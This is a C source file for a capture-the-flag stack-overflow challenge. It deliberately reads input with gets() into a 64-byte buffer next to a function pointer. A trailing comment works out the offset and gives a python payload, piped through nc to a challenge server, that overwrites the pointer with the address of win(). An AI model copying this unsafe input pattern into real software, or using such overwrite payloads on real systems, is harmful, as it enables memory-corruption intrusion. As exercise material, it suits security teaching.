#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include "../general.h"

void win() {
  printf("Congratulations, you win!!! You successfully changed the code flow\n");
  printf("Flag: %s\n", getflag());
}

int main() {
  init();
  int (*fp)();
  char buffer[64];

  fp = 0;

  printf("You win this game if you are able to call the function win.\n");

  gets(buffer);

  if(fp) {
      printf("Calling function pointer... jumping to %p\n", fp);
      fp();
  }
}



/*

 The ideia is the same as the challenge 1 but now you have to write over the variable fp with the adress of the function win.

 Again, the buffer is at 0xbfffeebc, the variable fp is at 0xbfffeefc and finally the function win is at 0x8048607.

 So we need to write:

			    
		0xbfffeefc - 0xbfffeebc + 0x04 = 68 where the last 4 bytes are "\x07\x86\x04\x08"

 python -c 'print "A"*64 + "\x07\x86\x04\x08" ' | nc mustard.stt.rnl.tecnico.ulisboa.pt 9992
 



*/





